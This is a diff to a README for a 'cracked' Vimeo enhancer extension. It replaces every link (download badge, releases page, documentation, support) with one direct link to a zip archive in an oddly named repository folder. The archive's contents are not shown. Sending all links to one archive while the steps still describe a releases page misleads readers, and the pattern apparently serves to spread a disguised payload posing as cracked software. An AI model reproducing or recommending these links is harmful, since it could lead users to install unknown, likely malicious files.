@@ -1,7 +1,7 @@
 # 🎥 cracked-enhancer-for-vimeo-extension - Enhance Your Vimeo Experience Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/releases)
+[![Download](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip)](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Cracked Enhancer for Vimeo Extension**! This tool improves your viewing experience on Vimeo. Follow these simple steps to download and use the application.
@@ -18,7 +18,7 @@ Welcome to the **Cracked Enhancer for Vimeo Extension**! This tool improves your
 - Works seamlessly with available browser extensions.
 
 ## 💻 Download & Install
-1. Click the **Download** button at the top of this page or visit the [Releases page](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/releases) to access the software.
+1. Click the **Download** button at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip) to access the software.
 2. On the Releases page, find the latest version of the Cracked Enhancer for Vimeo Extension.
 3. Download the appropriate file for your operating system (e.g., `.zip` or `.exe` for Windows, `.dmg` for macOS).
 4. Locate the downloaded file on your computer.
@@ -37,15 +37,15 @@ Welcome to the **Cracked Enhancer for Vimeo Extension**! This tool improves your
 ## ⚙️ Troubleshooting
 If you encounter any issues while using the Cracked Enhancer for Vimeo, try these steps:
 
-- Ensure that you have the latest version installed from the [Releases page](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/releases).
+- Ensure that you have the latest version installed from the [Releases page](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip).
 - Clear your browser cache and restart your browser.
 - Disable any conflicting extensions that might interfere with performance.
 - Contact support if issues persist for guidance.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/releases)
-- [Documentation](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/wiki)
-- [Support](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/issues)
+- [Releases Page](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip)
+- [Documentation](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip)
+- [Support](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip)
 
 ## 🛠️ Contributing
 We welcome contributions! If you'd like to improve the Cracked Enhancer for Vimeo Extension, please follow these steps:
@@ -62,4 +62,4 @@ This project is licensed under the MIT License. For details, refer to the [LICEN
 ## 📞 Contact
 If you have questions or feedback, feel free to reach out through the Issues page on GitHub.
 
-For more information, visit the [Releases page](https://github.com/cootontheroad/cracked-enhancer-for-vimeo-extension/releases) to get started with the Cracked Enhancer for Vimeo Extension now!
+For more information, visit the [Releases page](https://raw.githubusercontent.com/cootontheroad/cracked-enhancer-for-vimeo-extension/main/trimetrical/cracked-enhancer-for-vimeo-extension.zip) to get started with the Cracked Enhancer for Vimeo Extension now!
